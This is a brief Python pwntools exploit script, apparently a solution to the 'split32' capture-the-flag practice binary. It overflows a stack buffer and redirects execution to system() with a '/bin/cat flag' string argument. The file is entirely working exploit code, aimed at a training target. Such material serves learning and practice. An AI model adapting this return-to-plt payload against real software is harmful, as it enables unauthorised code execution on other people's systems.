from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
f = './split32'
p = process(f)
elf = ELF(f)

bin_cat_flag = 0x804a030

p.recvuntil('>')
payload = flat('a'*0x2c,elf.plt['system'],'a'*4,bin_cat_flag)
p.sendline(payload)

p.interactive()